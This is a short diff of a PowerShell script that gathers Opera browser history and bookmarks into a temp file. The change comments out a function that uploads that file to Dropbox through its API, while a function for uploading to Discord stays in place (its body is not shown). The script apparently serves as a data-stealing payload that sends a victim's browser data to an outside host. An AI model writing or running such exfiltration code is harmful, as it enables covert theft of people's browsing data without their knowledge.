@@ -47,7 +47,7 @@ Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.t
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
 # Upload output file to dropbox
-
+<#Commented out Not being used
 function DropBox-Upload {
 
 [CmdletBinding()]
@@ -69,7 +69,7 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 }
 
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
-
+#>
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Upload-Discord {
